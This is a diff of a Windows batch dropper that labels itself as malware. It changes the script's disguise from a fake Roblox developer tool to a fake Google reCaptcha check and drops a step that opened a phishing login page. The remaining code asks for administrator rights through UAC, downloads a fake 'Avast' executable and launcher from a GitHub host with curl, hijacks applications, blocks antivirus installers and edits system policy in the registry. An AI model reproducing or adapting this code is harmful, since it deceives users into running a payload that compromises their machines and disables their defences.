@@ -1,26 +1,11 @@
 @echo off
 :: this file is malware
-title Roblox Developer Console
+title reCaptcha by Google
 color f0
-echo [INFO] Starting Roblox Services...
+echo [INFO] Verifying...
 echo [INFO] ==================================================================================
-echo [INFO]   RRRRRRRR      OOOOOOO     BBBBBBBBB    LLL            OOOOOOO     XXX      XXX
-echo [INFO]   RRR   RRR    OOO   OOO    BB     BBB   LLL           OOO   OOO     XXX    XXX
-echo [INFO]   RRR   RRR   OOO     OOO   BB      BB   LLL          OOO     OOO     XXX  XXX
-echo [INFO]   RRRRRRRR    OOO     OOO   BBBBBBBBB    LLL          OOO     OOO      XXXXXX
-echo [INFO]   RRRRR       OOO     OOO   BBBBBBBBB    LLL          OOO     OOO      XXXXXX
-echo [INFO]   RRR RRR     OOO     OOO   BB      BB   LLL          OOO     OOO     XXX  XXX
-echo [INFO]   RRR  RRR     OOO   OOO    BB     BBB   LLLLLLLLLL    OOO   OOO     XXX    XXX
-echo [INFO]   RRR   RRR     OOOOOOO     BBBBBBBBB    LLLLLLLLLL     OOOOOOO     XXX      XXX
+echo [INFO]   reCaptcha by Google
 echo [INFO] ==================================================================================
-echo [INFO]   Developer Console Tool
-echo [INFO] ==================================================================================
-PATHPING 127.0.0.1 -n -q 1 -p 600)>NUL
-echo [ERROR] The Roblox installation files are protected, and we can't access them!
-echo [ERROR] To fix this, we need Administrator permissions.
-echo [WARNING] You will be prompted in 3 seconds.
-echo [WARNING] On the prompt, if you select No, this will not work!
-echo [WARNING] When you click 'yes', your account ID will be verified as age 18.
 :: ================================================
 :: Asks for admin with UAC prompt
 :: ================================================
@@ -54,13 +39,6 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 
 :: ========================================================================
-:: Opens fake login page
-:: ========================================================================
-
-start chrome.exe https://teamx-z.github.io/login.html
-start https://teamx-z.github.io/login.html
-
-:: ========================================================================
 :: Downloads fake avast
 :: ========================================================================
 
@@ -74,9 +52,9 @@ curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.git
 curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
 curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/launcher.exe
 
-:: ========================================================================
-:: Hijacking some apps with fake avast (also blocks av installers)
-:: ========================================================================
+:: ===========================================================================
+:: Hijacking some apps with fake avast (also blocks av installers by filename)
+:: ===========================================================================
 
 :: this is needed for the variables like !variable!
 setlocal EnableDelayedExpansion
@@ -110,4 +88,5 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 :: Exits stage one
 :: =================================
 exit
+
 
